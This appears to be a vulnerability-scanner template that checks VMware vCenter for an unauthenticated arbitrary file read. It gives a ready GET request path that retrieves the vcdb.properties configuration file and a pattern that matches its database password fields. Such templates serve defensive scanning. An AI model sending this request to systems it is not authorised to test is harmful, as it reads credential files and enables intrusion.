AUTHOR='@xer0dayz'
VULN_NAME='VMware vCenter Unauthenticated Arbitrary File Read'
URI='/eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties'
METHOD='GET'
MATCH="dbtype|password\.ecrypted"
SEVERITY='P2 - HIGH'
CURL_OPTS="--user-agent '' -s -L --insecure"
SECONDARY_COMMANDS=''
GREP_OPTIONS='-i'